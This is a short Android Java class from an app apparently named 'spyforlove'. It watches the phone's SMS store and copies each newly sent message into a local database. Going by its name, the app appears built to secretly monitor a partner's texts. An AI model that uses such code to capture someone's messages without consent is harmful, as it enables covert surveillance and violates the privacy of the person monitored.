package chem.kth.spyforlove.services;

import android.database.ContentObserver;
import android.os.Handler;
import android.util.Log;

import java.util.List;

import chem.kth.spyforlove.database.DatabaseHelper;
import chem.kth.spyforlove.model.SMessage;

class MessageSendObserver extends ContentObserver {
    public static final String TAG = MessageSendObserver.class.getName();

    public MessageSendObserver(Handler handler) {
        super(handler);
    }

    @Override
    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        DatabaseHelper databaseHelper = DatabaseHelper.getInstance();
        List<SMessage> last = DatabaseHelper.getInstance().readSMS(false);

        if (last.size() > 0) {
            List<SMessage> sMessageList = databaseHelper.getLastOutgoingSMS(last.get(0));
            if (sMessageList.size() == 0) {
                long i = DatabaseHelper.getInstance().saveMessage(last.get(0));
                if (i > 0) Log.d(TAG, "last sms save success");
            }
        }
    }
}